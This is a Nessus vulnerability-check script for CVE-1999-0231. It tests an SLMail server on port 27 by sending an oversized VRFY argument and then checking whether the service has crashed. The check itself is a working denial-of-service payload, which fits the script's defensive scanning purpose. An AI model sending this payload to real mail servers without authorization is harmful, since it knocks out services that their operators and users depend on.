#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#


if(description)
{
 script_id(10255);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-1999-0231");
 
 name["english"] = "SLMail:27 denial of service";
 name["francais"] = "Déni de service contre SLMail:27";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to perform a denial
of service against the remote SMTP server by
sending a too long argument to the VRFY command on
port 27.

This problem allows an attacker to bring down
your mail system, preventing you from sending
and receiving emails.


Solution : Update your MTA, or change it.

Risk factor : High";

 desc["francais"] = "Il a été possible de créer
un déni de service contre le serveur SMTP
distant en envoyant un argument trop long à
la commande VRFY on port 27.

Ce problème permet à un pirate de mettre à
genoux votre système de mail, vous empechant
ainsi d'envoyer ainsi que de recevoir des
messages.

Solution : Mettez à jour votre MTA, ou changez-le.
Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "VRFY aaaaa(...)aaa crashes the remote MTA";
 summary["francais"] = "VRFY aaaa(....)aaa plante le MTA distant";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "sendmail_expn.nasl");
 script_require_ports(27);
 exit(0);
}

#
# The script code starts here
#

port = 27;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  r = recv(socket:soc, length:1024);
  if(!r){
  	close(soc);
	exit(0);
	}
  data = string("VRFY ", crap(4096), "\r\n");
  send(socket:soc, data:data);
  close(soc);
  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
 }
}
